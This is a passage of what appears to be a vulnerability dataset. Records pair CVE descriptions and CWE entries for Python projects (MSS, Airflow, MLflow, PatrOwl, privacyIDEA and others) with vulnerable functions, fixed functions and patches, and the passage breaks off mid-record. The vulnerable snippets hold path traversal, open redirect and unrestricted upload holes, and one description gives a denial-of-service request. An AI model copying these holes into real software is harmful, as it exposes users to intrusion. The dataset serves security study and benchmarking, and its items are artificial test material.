shelf_title\n            shelf.is_public = is_public\n            if not shelf_id:\n                shelf.user_id = int(current_user.id)\n                ub.session.add(shelf)\n                shelf_action = \"created\"\n                flash_text = _(u\"Shelf %(title)s created\", title=shelf_title)\n            else:\n                shelf_action = \"changed\"\n                flash_text = _(u\"Shelf %(title)s changed\", title=shelf_title)\n            try:\n                ub.session.commit()\n                log.info(u\"Shelf {} {}\".format(shelf_title, shelf_action))\n                flash(flash_text, category=\"success\")\n                return redirect(url_for('shelf.show_shelf', shelf_id=shelf.id))\n            except (OperationalError, InvalidRequestError) as ex:\n                ub.session.rollback()\n                log.debug_or_exception(ex)\n                log.error(\"Settings DB is not Writeable\")\n                flash(_(\"Settings DB is not Writeable\"), category=\"error\")\n            except Exception as ex:\n                ub.session.rollback()\n                log.debug_or_exception(ex)\n                flash(_(u\"There was an error\"), category=\"error\")\n    return render_title_template('shelf_edit.html',\n                                 shelf=shelf,\n                                 title=page_title,\n                                 page=page,\n                                 kobo_sync_enabled=config.config_kobo_sync,\n                                 sync_only_selected_shelves=sync_only_selected_shelves)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_278_1",
        "commit": "0c0313f375bed7b035c8c0482bbb09599e16bfcf",
        "file_path": "cps/shelf.py",
        "start_line": 243,
        "end_line": 289,
        "snippet": "def create_edit_shelf(shelf, page_title, page, shelf_id=False):\n    sync_only_selected_shelves = current_user.kobo_only_shelves_sync\n    # calibre_db.session.query(ub.Shelf).filter(ub.Shelf.user_id == current_user.id).filter(ub.Shelf.kobo_sync).count()\n    if request.method == \"POST\":\n        to_save = request.form.to_dict()\n        if not current_user.role_edit_shelfs() and to_save.get(\"is_public\") == \"on\":\n            flash(_(u\"Sorry you are not allowed to create a public shelf\"), category=\"error\")\n            return redirect(url_for('web.index'))\n        is_public = 1 if to_save.get(\"is_public\") == \"on\" else 0\n        if config.config_kobo_sync:\n            shelf.kobo_sync = True if to_save.get(\"kobo_sync\") else False\n            if shelf.kobo_sync:\n                ub.session.query(ub.ShelfArchive).filter(ub.ShelfArchive.user_id == current_user.id).filter(\n                    ub.ShelfArchive.uuid == shelf.uuid).delete()\n                ub.session_commit()\n        shelf_title = to_save.get(\"title\", \"\")\n        if check_shelf_is_unique(shelf, shelf_title, is_public, shelf_id):\n            shelf.name = shelf_title\n            shelf.is_public = is_public\n            if not shelf_id:\n                shelf.user_id = int(current_user.id)\n                ub.session.add(shelf)\n                shelf_action = \"created\"\n                flash_text = _(u\"Shelf %(title)s created\", title=shelf_title)\n            else:\n                shelf_action = \"changed\"\n                flash_text = _(u\"Shelf %(title)s changed\", title=shelf_title)\n            try:\n                ub.session.commit()\n                log.info(u\"Shelf {} {}\".format(shelf_title, shelf_action))\n                flash(flash_text, category=\"success\")\n                return redirect(url_for('shelf.show_shelf', shelf_id=shelf.id))\n            except (OperationalError, InvalidRequestError) as ex:\n                ub.session.rollback()\n                log.debug_or_exception(ex)\n                log.error(\"Settings DB is not Writeable\")\n                flash(_(\"Settings DB is not Writeable\"), category=\"error\")\n            except Exception as ex:\n                ub.session.rollback()\n                log.debug_or_exception(ex)\n                flash(_(u\"There was an error\"), category=\"error\")\n    return render_title_template('shelf_edit.html',\n                                 shelf=shelf,\n                                 title=page_title,\n                                 page=page,\n                                 kobo_sync_enabled=config.config_kobo_sync,\n                                 sync_only_selected_shelves=sync_only_selected_shelves)"
      }
    ],
    "vul_patch": "--- a/cps/shelf.py\n+++ b/cps/shelf.py\n@@ -6,7 +6,7 @@\n         if not current_user.role_edit_shelfs() and to_save.get(\"is_public\") == \"on\":\n             flash(_(u\"Sorry you are not allowed to create a public shelf\"), category=\"error\")\n             return redirect(url_for('web.index'))\n-        is_public = 1 if to_save.get(\"is_public\") else 0\n+        is_public = 1 if to_save.get(\"is_public\") == \"on\" else 0\n         if config.config_kobo_sync:\n             shelf.kobo_sync = True if to_save.get(\"kobo_sync\") else False\n             if shelf.kobo_sync:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-25123",
    "cve_description": "MSS (Mission Support System) is an open source package designed for planning atmospheric research flights. In file: `index.py`, there is a method that is vulnerable to path manipulation attack. By modifying file paths, an attacker can acquire sensitive information from different resources. The `filename` variable is joined with other variables to form a file path in `_file`. However, `filename` is a route parameter that can capture path type values i.e. values including slashes (\\). So it is possible for an attacker to manipulate the file being read by assigning a value containing ../ to `filename` and so the attacker may be able to gain access to other files on the host filesystem. This issue has been addressed in MSS version 8.3.3. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "cwe_info": {
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/Open-MSS/MSS",
    "patch_url": [
      "https://github.com/Open-MSS/MSS/commit/f23033729ee930b97f8bdbd07df0174311c9b658"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_179_1",
        "commit": "75a1e48",
        "file_path": "mslib/index.py",
        "start_line": 162,
        "end_line": 174,
        "snippet": "    def code(filename):\n        download = request.args.get(\"download\", False)\n        _file = os.path.join(STATIC_LOCATION, 'code', filename)\n        content = get_content(_file)\n        if not download:\n            return render_template(\"/content.html\", act=\"code\", content=content)\n        else:\n            with open(_file) as f:\n                text = f.read()\n            return Response(\"\".join([s.replace(\"\\t\", \"\", 1) for s in text.split(\"```python\")[-1]\n                                    .splitlines(keepends=True)][1:-2]),\n                            mimetype=\"text/plain\",\n                            headers={\"Content-disposition\": f\"attachment; filename={filename.split('-')[0]}.py\"})"
      },
      {
        "id": "vul_py_179_2",
        "commit": "75a1e48",
        "file_path": "mslib/mscolab/server.py",
        "start_line": 375,
        "end_line": 381,
        "snippet": "def uploads(name=None, filename=None):\n    base_path = mscolab_settings.UPLOAD_FOLDER\n    if name is None:\n        abort(404)\n    if filename is None:\n        abort(404)\n    return send_from_directory(fs.path.join(base_path, name), filename)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_179_1",
        "commit": "f230337",
        "file_path": "mslib/index.py",
        "start_line": 163,
        "end_line": 179,
        "snippet": "    def code(filename):\n        download = request.args.get(\"download\", False)\n        _file = werkzeug.security.safe_join(STATIC_LOCATION, \"code\", filename)\n        if _file is None:\n            abort(404)\n        content = get_content(_file)\n        if not download:\n            return render_template(\"/content.html\", act=\"code\", content=content)\n        else:\n            if not os.path.isfile(_file):\n                abort(404)\n            with open(_file) as f:\n                text = f.read()\n            return Response(\"\".join([s.replace(\"\\t\", \"\", 1) for s in text.split(\"```python\")[-1]\n                                    .splitlines(keepends=True)][1:-2]),\n                            mimetype=\"text/plain\",\n                            headers={\"Content-disposition\": f\"attachment; filename={filename.split('-')[0]}.py\"})"
      },
      {
        "id": "fix_py_179_2",
        "commit": "75a1e48",
        "file_path": "mslib/mscolab/server.py",
        "start_line": 377,
        "end_line": 383,
        "snippet": "    if name is None:\n        abort(404)\n    if filename is None:\n        abort(404)\n    return send_from_directory(fs.path.join(base_path, name), filename)\n\n"
      }
    ],
    "vul_patch": "--- a/mslib/index.py\n+++ b/mslib/index.py\n@@ -1,10 +1,14 @@\n     def code(filename):\n         download = request.args.get(\"download\", False)\n-        _file = os.path.join(STATIC_LOCATION, 'code', filename)\n+        _file = werkzeug.security.safe_join(STATIC_LOCATION, \"code\", filename)\n+        if _file is None:\n+            abort(404)\n         content = get_content(_file)\n         if not download:\n             return render_template(\"/content.html\", act=\"code\", content=content)\n         else:\n+            if not os.path.isfile(_file):\n+                abort(404)\n             with open(_file) as f:\n                 text = f.read()\n             return Response(\"\".join([s.replace(\"\\t\", \"\", 1) for s in text.split(\"```python\")[-1]\n\n--- a/mslib/mscolab/server.py\n+++ b/mslib/mscolab/server.py\n@@ -1,7 +1,6 @@\n-def uploads(name=None, filename=None):\n-    base_path = mscolab_settings.UPLOAD_FOLDER\n     if name is None:\n         abort(404)\n     if filename is None:\n         abort(404)\n     return send_from_directory(fs.path.join(base_path, name), filename)\n+\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2015-10011",
    "cve_description": "A vulnerability classified as problematic has been found in OpenDNS OpenResolve. This affects an unknown part of the file resolverapi/endpoints.py. The manipulation leads to improper output neutralization for logs. The identifier of the patch is 9eba6ba5abd89d0e36a008921eb307fcef8c5311. It is recommended to apply a patch to fix this issue. The identifier VDB-217197 was assigned to this vulnerability.",
    "cwe_info": {
      "CWE-116": {
        "name": "Improper Encoding or Escaping of Output",
        "description": "The product prepares a structured message for communication with another component, but encoding or escaping of the data is either missing or done incorrectly. As a result, the intended structure of the message is not preserved."
      }
    },
    "repo": "https://github.com/opendns/OpenResolve",
    "patch_url": [
      "https://github.com/opendns/OpenResolve/commit/9eba6ba5abd89d0e36a008921eb307fcef8c5311"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_284_1",
        "commit": "e0f7933",
        "file_path": "resolverapi/endpoints.py",
        "start_line": 16,
        "end_line": 49,
        "snippet": "    def get(self, rdtype, domain):\n        t1 = time.time()\n\n        rdtype = rdtype.upper()\n        current_app.logger.info(\n            'Request from %s - %s %s', request.remote_addr, rdtype, domain)\n        self.valid_args(rdtype, domain)\n\n        # Iterate through nameservers so that we can tell which one gets used.\n        nameservers = current_app.config['RESOLVERS']\n        for nameserver in nameservers:\n            dns_resolver.nameservers = [nameserver]\n            try:\n                answer = dns_resolver.query(\n                    domain, rdtype, raise_on_no_answer=False)\n                # Successful query\n                break\n            except (NoNameservers, NXDOMAIN):\n                # TODO: this should still follow the RFC\n                return {'message': \"No nameservers for %s\" % domain}, 404\n            except Timeout as e:\n                # Communication fail or timeout - try next nameserver\n                if nameserver is nameservers[-1]:\n                    current_app.logger.info(e)\n                    return {'message': 'All nameservers timed out.'}, 503\n                continue\n            except Exception as e:\n                current_app.logger.error(e)\n                return {'message': 'An unexpected error occured.'}, 500\n\n        t2 = time.time()\n        duration = t2 - t1\n\n        return parse_query(answer, nameserver, duration)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_284_1",
        "commit": "9eba6ba5abd89d0e36a008921eb307fcef8c5311",
        "file_path": "resolverapi/endpoints.py",
        "start_line": 16,
        "end_line": 49,
        "snippet": "    def get(self, rdtype, domain):\n        t1 = time.time()\n\n        rdtype = rdtype.upper()\n        current_app.logger.info(\n            'Request from %s - %s', request.remote_addr, rdtype)\n        self.valid_args(rdtype, domain)\n\n        # Iterate through nameservers so that we can tell which one gets used.\n        nameservers = current_app.config['RESOLVERS']\n        for nameserver in nameservers:\n            dns_resolver.nameservers = [nameserver]\n            try:\n                answer = dns_resolver.query(\n                    domain, rdtype, raise_on_no_answer=False)\n                # Successful query\n                break\n            except (NoNameservers, NXDOMAIN):\n                # TODO: this should still follow the RFC\n                return {'message': \"No nameservers for %s\" % domain}, 404\n            except Timeout as e:\n                # Communication fail or timeout - try next nameserver\n                if nameserver is nameservers[-1]:\n                    current_app.logger.info(e)\n                    return {'message': 'All nameservers timed out.'}, 503\n                continue\n            except Exception as e:\n                current_app.logger.error(e)\n                return {'message': 'An unexpected error occured.'}, 500\n\n        t2 = time.time()\n        duration = t2 - t1\n\n        return parse_query(answer, nameserver, duration)"
      }
    ],
    "vul_patch": "--- a/resolverapi/endpoints.py\n+++ b/resolverapi/endpoints.py\n@@ -3,7 +3,7 @@\n \n         rdtype = rdtype.upper()\n         current_app.logger.info(\n-            'Request from %s - %s %s', request.remote_addr, rdtype, domain)\n+            'Request from %s - %s', request.remote_addr, rdtype)\n         self.valid_args(rdtype, domain)\n \n         # Iterate through nameservers so that we can tell which one gets used.\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2025-31479",
    "cve_description": "canonical/get-workflow-version-action is a GitHub composite action to get commit SHA that GitHub Actions reusable workflow was called with. Prior to 1.0.1, if the get-workflow-version-action step fails, the exception output may include the GITHUB_TOKEN. If the full token is included in the exception output, GitHub will automatically redact the secret from the GitHub Actions logs. However, the token may be truncated\u2014causing part of the GITHUB_TOKEN to be displayed in plaintext in the GitHub Actions logs. Anyone with read access to the GitHub repository can view GitHub Actions logs. For public repositories, anyone can view the GitHub Actions logs. The opportunity to exploit this vulnerability is limited\u2014the GITHUB_TOKEN is automatically revoked when the job completes. However, there is an opportunity for an attack in the time between the GITHUB_TOKEN being displayed in the logs and the completion of the job. Users using the github-token input are impacted. This vulnerability is fixed in 1.0.1.",
    "cwe_info": {
      "CWE-532": {
        "name": "Insertion of Sensitive Information into Log File",
        "description": "The product writes sensitive information to a log file."
      }
    },
    "repo": "https://github.com/canonical/get-workflow-version-action",
    "patch_url": [
      "https://github.com/canonical/get-workflow-version-action/commit/88281a62e96e1c0ef4df30352ae0668a9f3e3369"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_86_1",
        "commit": "a5d53b0",
        "file_path": "get_workflow_version/main.py",
        "start_line": "10",
        "end_line": "10",
        "snippet": "app = typer.Typer()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_86_1",
        "commit": "88281a6",
        "file_path": "get_workflow_version/main.py",
        "start_line": "11",
        "end_line": "11",
        "snippet": "app = typer.Typer(pretty_exceptions_show_locals=False)"
      }
    ],
    "vul_patch": "--- a/get_workflow_version/main.py\n+++ b/get_workflow_version/main.py\n@@ -1 +1 @@\n-app = typer.Typer()\n+app = typer.Typer(pretty_exceptions_show_locals=False)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-40754",
    "cve_description": "In Apache Airflow 2.3.0 through 2.3.4, there was an open redirect in the webserver's `/confirm` endpoint.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/apache/airflow",
    "patch_url": [
      "https://github.com/apache/airflow/commit/56e7555c42f013f789a4b718676ff09b4a9d5135",
      "https://github.com/apache/airflow/commit/3871f00230b7064e6234aa65b8a00ee2b6d33e4c"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_257_1",
        "commit": "e458eb6",
        "file_path": "airflow/www/views.py",
        "start_line": 2325,
        "end_line": 2407,
        "snippet": "    def confirm(self):\n        \"\"\"Show confirmation page for marking tasks as success or failed.\"\"\"\n        args = request.args\n        dag_id = args.get('dag_id')\n        task_id = args.get('task_id')\n        dag_run_id = args.get('dag_run_id')\n        state = args.get('state')\n        origin = args.get('origin')\n\n        if 'map_index' not in args:\n            map_indexes: list[int] | None = None\n        else:\n            map_indexes = args.getlist('map_index', type=int)\n\n        upstream = to_boolean(args.get('upstream'))\n        downstream = to_boolean(args.get('downstream'))\n        future = to_boolean(args.get('future'))\n        past = to_boolean(args.get('past'))\n        origin = origin or url_for('Airflow.index')\n\n        dag = get_airflow_app().dag_bag.get_dag(dag_id)\n        if not dag:\n            msg = f'DAG {dag_id} not found'\n            return redirect_or_json(origin, msg, status='error', status_code=404)\n\n        try:\n            task = dag.get_task(task_id)\n        except airflow.exceptions.TaskNotFound:\n            msg = f\"Task {task_id} not found\"\n            return redirect_or_json(origin, msg, status='error', status_code=404)\n\n        task.dag = dag\n\n        if state not in (\n            'success',\n            'failed',\n        ):\n            msg = f\"Invalid state {state}, must be either 'success' or 'failed'\"\n            return redirect_or_json(origin, msg, status='error', status_code=400)\n\n        latest_execution_date = dag.get_latest_execution_date()\n        if not latest_execution_date:\n            msg = f\"Cannot mark tasks as {state}, seem that dag {dag_id} has never run\"\n            return redirect_or_json(origin, msg, status='error', status_code=400)\n\n        if map_indexes is None:\n            tasks: list[Operator] | list[tuple[Operator, int]] = [task]\n        else:\n            tasks = [(task, map_index) for map_index in map_indexes]\n\n        to_be_altered = set_state(\n            tasks=tasks,\n            run_id=dag_run_id,\n            upstream=upstream,\n            downstream=downstream,\n            future=future,\n            past=past,\n            state=state,\n            commit=False,\n        )\n\n        if request.headers.get('Accept') == 'application/json':\n            details = [str(t) for t in to_be_altered]\n            return htmlsafe_json_dumps(details, separators=(',', ':'))\n\n        details = \"\\n\".join(str(t) for t in to_be_altered)\n\n        response = self.render_template(\n            \"airflow/confirm.html\",\n            endpoint=url_for(f'Airflow.{state}'),\n            message=f\"Task instances you are about to mark as {state}:\",\n            details=details,\n        )\n\n        return response\n\n    @expose('/failed', methods=['POST'])\n    @auth.has_access(\n        [\n            (permissions.ACTION_CAN_EDIT, permissions.RESOURCE_DAG),\n            (permissions.ACTION_CAN_EDIT, permissions.RESOURCE_TASK_INSTANCE),\n        ]\n    )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_257_1",
        "commit": "56e7555",
        "file_path": "airflow/www/views.py",
        "start_line": 2325,
        "end_line": 2407,
        "snippet": "    def confirm(self):\n        \"\"\"Show confirmation page for marking tasks as success or failed.\"\"\"\n        args = request.args\n        dag_id = args.get('dag_id')\n        task_id = args.get('task_id')\n        dag_run_id = args.get('dag_run_id')\n        state = args.get('state')\n        origin = get_safe_url(args.get('origin'))\n\n        if 'map_index' not in args:\n            map_indexes: list[int] | None = None\n        else:\n            map_indexes = args.getlist('map_index', type=int)\n\n        upstream = to_boolean(args.get('upstream'))\n        downstream = to_boolean(args.get('downstream'))\n        future = to_boolean(args.get('future'))\n        past = to_boolean(args.get('past'))\n        origin = origin or url_for('Airflow.index')\n\n        dag = get_airflow_app().dag_bag.get_dag(dag_id)\n        if not dag:\n            msg = f'DAG {dag_id} not found'\n            return redirect_or_json(origin, msg, status='error', status_code=404)\n\n        try:\n            task = dag.get_task(task_id)\n        except airflow.exceptions.TaskNotFound:\n            msg = f\"Task {task_id} not found\"\n            return redirect_or_json(origin, msg, status='error', status_code=404)\n\n        task.dag = dag\n\n        if state not in (\n            'success',\n            'failed',\n        ):\n            msg = f\"Invalid state {state}, must be either 'success' or 'failed'\"\n            return redirect_or_json(origin, msg, status='error', status_code=400)\n\n        latest_execution_date = dag.get_latest_execution_date()\n        if not latest_execution_date:\n            msg = f\"Cannot mark tasks as {state}, seem that dag {dag_id} has never run\"\n            return redirect_or_json(origin, msg, status='error', status_code=400)\n\n        if map_indexes is None:\n            tasks: list[Operator] | list[tuple[Operator, int]] = [task]\n        else:\n            tasks = [(task, map_index) for map_index in map_indexes]\n\n        to_be_altered = set_state(\n            tasks=tasks,\n            run_id=dag_run_id,\n            upstream=upstream,\n            downstream=downstream,\n            future=future,\n            past=past,\n            state=state,\n            commit=False,\n        )\n\n        if request.headers.get('Accept') == 'application/json':\n            details = [str(t) for t in to_be_altered]\n            return htmlsafe_json_dumps(details, separators=(',', ':'))\n\n        details = \"\\n\".join(str(t) for t in to_be_altered)\n\n        response = self.render_template(\n            \"airflow/confirm.html\",\n            endpoint=url_for(f'Airflow.{state}'),\n            message=f\"Task instances you are about to mark as {state}:\",\n            details=details,\n        )\n\n        return response\n\n    @expose('/failed', methods=['POST'])\n    @auth.has_access(\n        [\n            (permissions.ACTION_CAN_EDIT, permissions.RESOURCE_DAG),\n            (permissions.ACTION_CAN_EDIT, permissions.RESOURCE_TASK_INSTANCE),\n        ]\n    )"
      }
    ],
    "vul_patch": "--- a/airflow/www/views.py\n+++ b/airflow/www/views.py\n@@ -5,7 +5,7 @@\n         task_id = args.get('task_id')\n         dag_run_id = args.get('dag_run_id')\n         state = args.get('state')\n-        origin = args.get('origin')\n+        origin = get_safe_url(args.get('origin'))\n \n         if 'map_index' not in args:\n             map_indexes: list[int] | None = None\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-43829",
    "cve_description": "PatrOwl is a free and open-source solution for orchestrating Security Operations. In versions prior to 1.7.7 PatrowlManager unrestrictly handle upload files in the findings import feature. This vulnerability is capable of uploading dangerous type of file to server leading to XSS attacks and potentially other forms of code injection. Users are advised to update to 1.7.7 as soon as possible. There are no known workarounds for this issue.",
    "cwe_info": {
      "CWE-434": {
        "name": "Unrestricted Upload of File with Dangerous Type",
        "description": "The product allows the upload or transfer of dangerous file types that are automatically processed within its environment."
      }
    },
    "repo": "https://github.com/Patrowl/PatrowlManager",
    "patch_url": [
      "https://github.com/Patrowl/PatrowlManager/commit/2287c9715d2e7ef11b44bb0ad4a57727654f2203"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_161_1",
        "commit": "bafc9bb",
        "file_path": "findings/forms.py",
        "start_line": 12,
        "end_line": 23,
        "snippet": "class ImportFindingsForm(forms.Form):\n    class Meta:\n        fields = ['engine', 'min_level', 'file']\n\n    engine = forms.CharField(widget=forms.Select(\n        attrs={'class': 'form-control form-control-sm'},\n        choices=ENGINE_TYPES))\n    min_level = forms.CharField(widget=forms.Select(\n        attrs={'class': 'form-control form-control-sm'},\n        choices=FINDING_SEVERITIES),\n        label='Minimum severity')\n    file = forms.FileField()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_161_1",
        "commit": "2287c97",
        "file_path": "findings/forms.py",
        "start_line": 13,
        "end_line": 34,
        "snippet": "def validate_file_extension(value):\n    ext = os.path.splitext(value.name)[1]\n    valid_extensions = ['.xml', '.nessus', '.json']\n    if ext not in valid_extensions:\n        raise ValidationError(u'File not supported!')\n\n\nclass ImportFindingsForm(forms.Form):\n    class Meta:\n        fields = ['engine', 'min_level', 'file']\n\n    engine = forms.CharField(widget=forms.Select(\n        attrs={'class': 'form-control form-control-sm'},\n        choices=ENGINE_TYPES))\n    min_level = forms.CharField(widget=forms.Select(\n        attrs={'class': 'form-control form-control-sm'},\n        choices=FINDING_SEVERITIES),\n        label='Minimum severity')\n    file = forms.FileField(widget=forms.FileInput(\n        attrs={'accept': 'text/xml,application/json'}),\n        validators=[validate_file_extension]\n    )"
      }
    ],
    "vul_patch": "--- a/findings/forms.py\n+++ b/findings/forms.py\n@@ -1,3 +1,10 @@\n+def validate_file_extension(value):\n+    ext = os.path.splitext(value.name)[1]\n+    valid_extensions = ['.xml', '.nessus', '.json']\n+    if ext not in valid_extensions:\n+        raise ValidationError(u'File not supported!')\n+\n+\n class ImportFindingsForm(forms.Form):\n     class Meta:\n         fields = ['engine', 'min_level', 'file']\n@@ -9,4 +16,7 @@\n         attrs={'class': 'form-control form-control-sm'},\n         choices=FINDING_SEVERITIES),\n         label='Minimum severity')\n-    file = forms.FileField()\n+    file = forms.FileField(widget=forms.FileInput(\n+        attrs={'accept': 'text/xml,application/json'}),\n+        validators=[validate_file_extension]\n+    )\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-6015",
    "cve_description": "MLflow allowed arbitrary files to be PUT onto the server.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/mlflow/mlflow",
    "patch_url": [
      "https://github.com/mlflow/mlflow/commit/cf83dad4df26dd4a850622fe8a51ccab1471a5e7"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_143_1",
        "commit": "e8c003a",
        "file_path": "mlflow/server/handlers.py",
        "start_line": 539,
        "end_line": 556,
        "snippet": "def validate_path_is_safe(path):\n    \"\"\"\n    Validates that the specified path is safe to join with a trusted prefix. This is a security\n    measure to prevent path traversal attacks.\n    A valid path should:\n        not contain separators other than '/'\n        not contain .. to navigate to parent dir in path\n        not be an absolute path\n    \"\"\"\n    if is_file_uri(path):\n        path = local_file_uri_to_path(path)\n    if (\n        any((s in path) for s in _OS_ALT_SEPS)\n        or \"..\" in path.split(\"/\")\n        or pathlib.PureWindowsPath(path).is_absolute()\n        or pathlib.PurePosixPath(path).is_absolute()\n    ):\n        raise MlflowException(f\"Invalid path: {path}\", error_code=INVALID_PARAMETER_VALUE)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_143_1",
        "commit": "cf83dad",
        "file_path": "mlflow/server/handlers.py",
        "start_line": 540,
        "end_line": 558,
        "snippet": "def validate_path_is_safe(path):\n    \"\"\"\n    Validates that the specified path is safe to join with a trusted prefix. This is a security\n    measure to prevent path traversal attacks.\n    A valid path should:\n        not contain separators other than '/'\n        not contain .. to navigate to parent dir in path\n        not be an absolute path\n    \"\"\"\n    if is_file_uri(path):\n        path = local_file_uri_to_path(path)\n    if (\n        any((s in path) for s in _OS_ALT_SEPS)\n        or \"..\" in path.split(\"/\")\n        or pathlib.PureWindowsPath(path).is_absolute()\n        or pathlib.PurePosixPath(path).is_absolute()\n        or (is_windows() and len(path) >= 2 and path[1] == \":\")\n    ):\n        raise MlflowException(f\"Invalid path: {path}\", error_code=INVALID_PARAMETER_VALUE)"
      }
    ],
    "vul_patch": "--- a/mlflow/server/handlers.py\n+++ b/mlflow/server/handlers.py\n@@ -14,5 +14,6 @@\n         or \"..\" in path.split(\"/\")\n         or pathlib.PureWindowsPath(path).is_absolute()\n         or pathlib.PurePosixPath(path).is_absolute()\n+        or (is_windows() and len(path) >= 2 and path[1] == \":\")\n     ):\n         raise MlflowException(f\"Invalid path: {path}\", error_code=INVALID_PARAMETER_VALUE)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2018-1000809",
    "cve_description": "privacyIDEA version 2.23.1 and earlier contains a Improper Input Validation vulnerability in token validation api that can result in Denial-of-Service. This attack appear to be exploitable via http request with user=<space>&pass= to /validate/check url. This vulnerability appears to have been fixed in 2.23.2.",
    "cwe_info": {
      "CWE-20": {
        "name": "Improper Input Validation",
        "description": "The product receives input or data, but it does\n        not validate or incorrectly validates that the input has the\n        properties that are required to process the data safely and\n        correctly."
      }
    },
    "repo": "https://github.com/privacyidea/privacyidea",
    "patch_url": [
      "https://github.com/privacyidea/privacyidea/commit/a3edc09beffa2104f357fe24971ea3211ce40751"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_255_1",
        "commit": "aded3ad",
        "file_path": "privacyidea/lib/decorators.py",
        "start_line": 84,
        "end_line": 92,
        "snippet": "    def __call__(self, func):\n        @functools.wraps(func)\n        def check_user_or_serial_in_request_wrapper(*args, **kwds):\n            user = self.request.all_data.get(\"user\")\n            serial = self.request.all_data.get(\"serial\")\n            if not serial and not user:\n                raise ParameterError(_(\"You need to specify a serial or a user.\"))\n            f_result = func(*args, **kwds)\n            return f_result"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_255_1",
        "commit": "a3edc09",
        "file_path": "privacyidea/lib/decorators.py",
        "start_line": 84,
        "end_line": 97,
        "snippet": "    def __call__(self, func):\n        @functools.wraps(func)\n        def check_user_or_serial_in_request_wrapper(*args, **kwds):\n            user = self.request.all_data.get(\"user\", \"\").strip()\n            serial = self.request.all_data.get(\"serial\", \"\").strip()\n            if not serial and not user:\n                raise ParameterError(_(\"You need to specify a serial or a user.\"))\n            if \"*\" in serial:\n                raise ParameterError(_(\"Invalid serial number.\"))\n            if \"%\" in user:\n                raise ParameterError(_(\"Invalid user.\"))\n\n            f_result = func(*args, **kwds)\n            return f_result"
      }
    ],
    "vul_patch": "--- a/privacyidea/lib/decorators.py\n+++ b/privacyidea/lib/decorators.py\n@@ -1,9 +1,14 @@\n     def __call__(self, func):\n         @functools.wraps(func)\n         def check_user_or_serial_in_request_wrapper(*args, **kwds):\n-            user = self.request.all_data.get(\"user\")\n-            serial = self.request.all_data.get(\"serial\")\n+            user = self.request.all_data.get(\"user\", \"\").strip()\n+            serial = self.request.all_data.get(\"serial\", \"\").strip()\n             if not serial and not user:\n                 raise ParameterError(_(\"You need to specify a serial or a user.\"))\n+            if \"*\" in serial:\n+                raise ParameterError(_(\"Invalid serial number.\"))\n+            if \"%\" in user:\n+                raise ParameterError(_(\"Invalid user.\"))\n+\n             f_result = func(*args, **kwds)\n             return f_result\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2016-1000001",
    "cve_description": "flask-oidc version 0.1.2 and earlier is vulnerable to an open redirect",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/puiterwijk/flask-oidc",
    "patch_url": [
      "https://github.com/puiterwijk/flask-oidc/commit/f2ef8b4ffa445be00f6602e446e60916f4ee4d30"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_177_1",
        "commit": "e4ce56a",
        "file_path": "flask_oidc/__init__.py",
        "start_line": 50,
        "end_line": 87,
